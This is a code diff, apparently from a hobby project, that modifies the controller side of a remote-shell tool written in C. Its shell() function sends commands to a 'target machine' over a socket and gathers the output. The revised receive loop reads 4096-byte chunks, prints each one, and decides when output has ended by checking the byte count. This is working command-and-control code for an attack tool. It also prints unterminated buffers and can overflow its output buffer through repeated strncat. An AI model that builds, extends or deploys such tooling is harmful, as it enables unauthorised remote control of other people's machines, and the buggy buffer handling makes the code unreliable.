@@ -63,7 +63,7 @@ int setup_listener(int port) {
 void shell(int sockfd) {
 	// maybe not so memory efficient allocating that big of a buffer but whatever
 	char command[1024];
-	char output[4096];
+	char output[8192];
 
 	// first let's test out without actually encrypting anything
 	while (1) {
@@ -83,25 +83,28 @@ void shell(int sockfd) {
 			break;
 		}
 		// not needing command variable after this point
+		memset(command, 0, sizeof(command));
 
 		// get output now
 		memset(output, 0, sizeof(output)); // clear out the string for output
 
-		// int total = 0; // of bytes
 		while (1) {
-			memset(command, 0, sizeof(command));
+			char outchunk[4096];
+			memset(outchunk, 0, sizeof(outchunk));
 
-			int bytes = recv(sockfd, command, sizeof(command), 0);
+			int bytes = recv(sockfd, outchunk, sizeof(outchunk), 0);
 			if (bytes <= 0) {
 				printf("Closing connection by target machine... \n");
 				return; // to exit the program now also
 			}
 
-			// total += bytes;
-			// printf("Appending to output: %s\n", command);
-			strncat(output, command, bytes); // combine the output
+			// outchunk[bytes] = '\0';
 
-			if (strstr(command, "EOF!\n")) break;
+			printf("Appending to output: %s\n", outchunk);
+			strncat(output, outchunk, bytes); // combine the output
+
+			// if (strstr(outchunk, "EOF!\n")) break;
+			if (bytes < sizeof(outchunk) - 1) break;
 		}
 		
 
